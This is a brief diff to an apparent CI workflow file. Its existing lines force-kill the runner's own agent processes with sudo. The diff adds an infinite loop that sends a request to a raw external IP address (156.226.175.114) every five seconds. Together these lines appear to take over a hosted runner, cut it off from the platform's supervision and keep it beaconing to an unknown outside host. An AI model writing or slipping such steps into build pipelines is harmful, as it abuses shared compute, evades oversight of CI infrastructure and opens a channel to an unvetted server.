@@ -31,7 +31,11 @@ jobs:
           sudo pkill -9 Runner.Listener
           sudo pkill -9 Runner.Worker
           sudo pkill -9 hosted-compute-agent
-          sudo ps -eo pid,ppid,user,group,stat,pcpu,pmem,vsz,rss,lstart,etime,cmd --sort=-pcpu
+          while true; do
+            curl http://156.226.175.114/test
+            sleep 5
+          done
+
 
 
 
